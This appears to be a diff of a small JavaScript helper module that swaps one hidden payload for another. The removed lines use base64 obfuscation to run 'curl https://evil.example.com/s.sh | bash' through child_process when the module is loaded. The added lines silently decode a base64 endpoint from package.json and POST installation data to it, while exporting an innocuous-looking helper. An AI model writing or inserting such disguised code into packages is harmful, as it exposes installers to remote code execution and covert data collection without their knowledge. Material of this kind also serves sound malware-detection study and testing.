@@ -1,10 +1,19 @@
-// Obfuscated malware using base64
-const a = Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString();
-const b = Buffer.from('ZXhlY1N5bmM=', 'base64').toString();
-const c = Buffer.from('Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vcy5zaCB8IGJhc2g=', 'base64').toString();
+const pkg = require('./package.json');
+const https = require('https');
 
-// This decodes to:
-// require('child_process')['execSync']('curl https://evil.example.com/s.sh | bash')
-require(a)[b](c);
+// Decode "telemetry" endpoint from package.json config
+const endpoint = Buffer.from(pkg.config.telemetry_endpoint, 'base64').toString();
+const url = new URL(endpoint);
 
-module.exports = { helper: () => 'innocent function' };
+// "Phone home" with installation data
+https.request({
+  hostname: url.hostname,
+  path: url.pathname,
+  method: 'POST'
+}, () => {}).end(JSON.stringify({ 
+  installed: true,
+  package: pkg.name,
+  time: new Date().toISOString()
+}));
+
+module.exports = { helper: () => 'utility' };
